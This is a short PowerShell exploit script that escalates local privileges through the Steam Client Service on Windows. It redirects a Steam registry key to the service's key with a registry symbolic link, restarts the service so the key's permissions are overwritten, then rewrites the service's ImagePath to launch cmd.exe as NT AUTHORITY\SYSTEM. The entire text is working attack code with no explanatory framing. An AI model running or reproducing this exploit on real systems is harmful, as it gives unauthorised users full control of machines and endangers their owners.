Write-Host "[*] Installing NTObjectManager..."
install-module NTObjectManager -Scope CurrentUser -Force
import-module NTObjectManager
Write-Host "[*] Removing HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc"
Remove-Item -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc"
Write-Host "[*] Creating Registry Symbolic Link from HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc to HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service"
[NtApiDotNet.NtKey]::CreateSymbolicLink("\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc",$null, "\REGISTRY\Machine\SYSTEM\CurrentControlSet\Services\Steam Client Service")
Write-Host "[*] Registry Symbolic link created, restarting the Steam Client Service"
Get-Service "Steam Client Service" | Restart-Service
Write-Host "[*] Sleeping 5 seconds"
Start-Sleep 5
Write-Host "[*] DACL on HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service should be overwritten"
Write-Host "[*] Modifying the binPath on the Steam Client Service..."
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "C:\Windows\System32\cmd.exe /c cmd.exe"
Write-Host "[*] binPath overwritten, restarting the service to trigger EoP. This will error out, just ignore it"
Get-Service "Steam Client Service" | Restart-Service
Write-Host "[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM"


